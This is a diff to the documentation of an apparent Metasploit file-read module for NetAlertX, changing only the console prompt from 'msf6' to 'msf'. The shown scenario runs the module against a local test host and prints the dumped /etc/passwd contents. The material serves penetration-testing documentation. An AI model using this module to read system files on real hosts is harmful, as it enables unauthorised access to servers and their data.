@@ -41,8 +41,8 @@ docker run --rm --network=host \
 ## Scenarios
 
 ```
-msf6 > use auxiliary/scanner/http/netalertx_file_read 
-msf6 auxiliary(scanner/http/netalertx_file_read) > show options
+msf > use auxiliary/scanner/http/netalertx_file_read 
+msf auxiliary(scanner/http/netalertx_file_read) > show options
 
 Module options (auxiliary/scanner/http/netalertx_file_read):
 
@@ -61,9 +61,9 @@ Module options (auxiliary/scanner/http/netalertx_file_read):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(scanner/http/netalertx_file_read) > set RHOSTS 127.0.0.1
+msf auxiliary(scanner/http/netalertx_file_read) > set RHOSTS 127.0.0.1
 RHOSTS => 127.0.0.1
-msf6 auxiliary(scanner/http/netalertx_file_read) > run
+msf auxiliary(scanner/http/netalertx_file_read) > run
 [*] Received data:
 [*] root:x:0:0:root:/root:/bin/sh
 bin:x:1:1:bin:/bin:/sbin/nologin
@@ -88,7 +88,7 @@ nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin
 [*] Stored results in netalert_result.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/netalertx_file_read) > 
+msf auxiliary(scanner/http/netalertx_file_read) > 
 
 
 ```
